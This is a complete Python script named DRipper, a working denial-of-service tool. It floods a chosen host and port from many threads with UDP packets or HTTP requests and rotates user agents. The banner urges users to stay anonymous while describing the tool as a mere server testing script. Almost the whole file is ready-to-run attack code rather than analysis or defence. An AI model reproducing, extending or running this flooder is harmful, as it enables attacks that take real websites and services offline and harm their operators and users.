import random
import socket
import string
import signal
import sys
import threading
import time
import urllib.request
from dataclasses import dataclass, field
from optparse import OptionParser

# Constants
USAGE = 'Usage: python %prog [options] arg'
EPILOG = 'Example: python DRipper.py -s 192.168.0.1 -p 80 -t 100'
GETTING_SERVER_IP_ERROR_MSG = "\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m"

lock = threading.Lock()


@dataclass
class Context:
    """Class for passing a context to a parallel processes."""
    # Input params
    host: str = ''
    port: int = 80
    threads: int = 100
    random_packet_len: bool = False
    attack_method: str = None
    protocol: str = 'http://'
    url: str = None

    # Internal vars
    user_agents: list = None
    base_headers: list = None
    headers = None

    # Statistic
    external_ip: str = ''
    packets_sent: int = 0
    connections_success: int = 0
    connections_failed: int = 0
    errors: list[str] = field(default_factory=list)

    show_statistics = False


def init_context(_ctx, args):
    """Initialize Context from Input args."""
    _ctx.host = args[0].host
    _ctx.port = args[0].port
    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"

    _ctx.threads = args[0].threads

    _ctx.attack_method = args[0].attack_method
    _ctx.random_packet_len = bool(args[0].random_packet_len)

    _ctx.user_agents = readfile('useragents.txt')
    _ctx.base_headers = readfile('headers.txt')
    _ctx.headers = set_headers_dict(_ctx.base_headers)

    _ctx.external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')


def readfile(filename: str):
    """Read string from file."""
    file = open(filename, "r")
    content = file.readlines()
    file.close()

    return content


def set_headers_dict(base_headers: list[str]):
    """Set headers for the request"""
    headers_dict = {}
    for line in base_headers:
        parts = line.split(':')
        headers_dict[parts[0]] = parts[1].strip()

    return headers_dict


def get_random_string(len_from, len_to):
    """Random string with different length"""
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))

    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def down_it_udp(_ctx: Context):
    i = 1
    while True:
        extra_data = get_random_string(0, 5000) if _ctx.random_packet_len else ''

        packet = str(
            "GET / HTTP/1.1\nHost: " + _ctx.host
            + "\n\n User-Agent: "
            + random.choice(_ctx.user_agents)
            + "\n" + _ctx.base_headers[0]
            + "\n\n" + extra_data).encode('utf-8')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # p = int(_ctx.port) if _ctx.port else get_random_port()

        try:
            sock.sendto(packet, (_ctx.host, _ctx.port))
        except socket.gaierror:
            if GETTING_SERVER_IP_ERROR_MSG not in _ctx.errors:
                _ctx.errors.append(GETTING_SERVER_IP_ERROR_MSG)
        else:
            if GETTING_SERVER_IP_ERROR_MSG in _ctx.errors:
                _ctx.errors.remove(GETTING_SERVER_IP_ERROR_MSG)
            _ctx.packets_sent += 1
            # print('\033[92m Packet was sent \033[0;0m')
        sock.close()

        if _ctx.port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host, args=[_ctx])
                thread.daemon = True
                thread.start()

        lock.acquire()
        if not _ctx.show_statistics:
            thread = threading.Thread(target=show_statistics, args=[_ctx])
            thread.daemon = True
            thread.start()
        lock.release()
        time.sleep(.01)


def down_it_http(_ctx: Context):
    while True:
        http_headers = _ctx.headers
        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()

        try:
            urllib.request.urlopen(
                urllib.request.Request(_ctx.url, headers=http_headers))
        except:
            _ctx.connections_failed += 1
        else:
            _ctx.connections_success += 1
            # print('\033[92m HTTP-Request was done \033[0;0m')

        _ctx.packets_sent += 1

        if not _ctx.show_statistics:
            _ctx.show_statistics = True
            show_statistics(_ctx)
            _ctx.show_statistics = False

        time.sleep(.01)


def logo():
    print(''' \033[0;95m

██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗
██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝

It is the end user's responsibility to obey all applicable laws.
It is just like a server testing script and Your IP is visible. Please, make sure you are anonymous!
    \033[0m ''')


def usage(parser):
    """Wrapper for Logo with help."""
    logo()
    parser.print_help()
    sys.exit()


def parse_args(parser):
    """Initialize command line arguments parser and parse CLI arguments."""
    parser_add_options(parser)

    return parser.parse_args()


def parser_add_options(parser):
    """Add options to a parser."""
    parser.add_option('-p', '--port',
                      dest='port', type='int', default=80,
                      help='port (default: 80)')
    parser.add_option('-t', '--threads',
                      dest='threads', type='int', default=100,
                      help='threads (default: 100)')
    parser.add_option('-r', '--random_len',
                      dest='random_packet_len', type='int',
                      help='Send random packets with random length')
    parser.add_option('-m', '--method',
                      dest='attack_method', type='str', default='udp',
                      help='Attack method: UDP (default), HTTP')
    parser.add_option('-s', '--server',
                      dest='host',
                      help='Attack to server IP')


def check_host(host):
    """Check Server IP."""
    error_msg = "\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m"
    if not host:
        print(error_msg)
        exit(1)

    try:
        socket.gethostbyname(host)
    except:
        print(error_msg)
        exit(1)


def connect_host(_ctx: Context):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((_ctx.host, _ctx.port))
    except:
        _ctx.connections_failed += 1
    else:
        _ctx.connections_success += 1


def show_info(_ctx: Context):
    """Prints attack info to console."""
    logo()
    m = f"Your current IP: \033[94m{_ctx.external_ip}\033[0m\n"
    m += f"Host, port: \033[94m{_ctx.host}:{_ctx.port}\033[0m\n"
    m += f"Attack method: \033[94m{_ctx.attack_method}\033[0m\n"
    m += f"Threads: \033[94m{_ctx.threads}\033[0m\n"
    if _ctx.attack_method == 'udp' and _ctx.random_packet_len:
        m += f"Random packet length: yes\n"
    m += '\n'
    sys.stdout.write(m)
    sys.stdout.flush()


def show_statistics(_ctx: Context):
    """Prints statistics to console."""
    _ctx.show_statistics = True
    packets_sent = str(_ctx.packets_sent)
    connections_success = str(_ctx.connections_success)
    connections_failed = str(_ctx.connections_failed)

    m = ''
    if _ctx.attack_method == 'udp':
        m = f"UDP packets sent: \033[92m{packets_sent}\033[0;0m; "
    elif _ctx.attack_method == 'http':
        m = f"HTTP requests sent: \033[92m{packets_sent}\033[0;0m. "

    m += f"Connections: successful - \033[92m{connections_success}\033[0;0m, failed - \033[91m{connections_failed}\033[0m\r"
    sys.stdout.write(m)
    sys.stdout.flush()
    time.sleep(3)
    _ctx.show_statistics = False


def create_thread_pool(_ctx: Context) -> list:
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
        elif _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()
    return thread_pool


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2:
        usage(parser)

    _ctx = Context()
    init_context(_ctx, args)

    check_host(_ctx.host)
    connect_host(_ctx)

    # p = str(_port) if _port else '(22, 53, 80, 443)'
    print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
    print("\033[94mPlease wait...\033[0m")

    time.sleep(1)
    show_info(_ctx)
    create_thread_pool(_ctx)

    while True:
        time.sleep(1)


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:  # The user hit Control-C
        sys.stderr.write('\n\nReceived keyboard interrupt, terminating.\n\n')
        sys.stderr.flush()
        # Control-C is fatal error signal 2, for more see
        # https://tldp.org/LDP/abs/html/exitcodes.html
        sys.exit(128 + signal.SIGINT)
    except RuntimeError as exc:
        sys.stderr.write(f'\n{exc}\n\n')
        sys.stderr.flush()
        sys.exit(1)
